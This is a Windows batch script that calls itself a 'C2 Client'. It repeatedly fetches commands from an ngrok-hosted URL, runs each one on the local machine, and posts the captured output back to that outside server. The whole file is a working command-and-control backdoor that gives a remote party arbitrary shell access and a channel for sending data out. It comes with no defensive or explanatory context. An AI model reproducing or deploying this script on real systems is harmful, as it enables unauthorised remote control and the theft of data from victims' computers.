@echo off
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev

echo [*] Starting C2 Client
echo [*] URL: %URL%

:loop
    ping -n 2 127.0.0.1 >nul
    
    rem Get command from server
    for /f "usebackq delims=" %%A in (`curl -s %URL% 2^>nul`) do set CMD=%%A
    
    if "%CMD%"=="" goto loop
    
    echo [*] Executing: %CMD%
    
    rem Create temp file to capture output (handles special chars better)
    set TEMPFILE=%TEMP%\c2_output.txt
    %CMD% > "%TEMPFILE%" 2>&1
    
    rem Send output back line by line
    for /f "usebackq delims=" %%O in ("%TEMPFILE%") do (
        curl -X POST -d "%%O" %URL% 2>nul
    )
    
    rem If file is empty, send empty response
    if not exist "%TEMPFILE%" (
        curl -X POST -d "" %URL% 2>nul
    )
    
    del "%TEMPFILE%" 2>nul
    
    goto loop
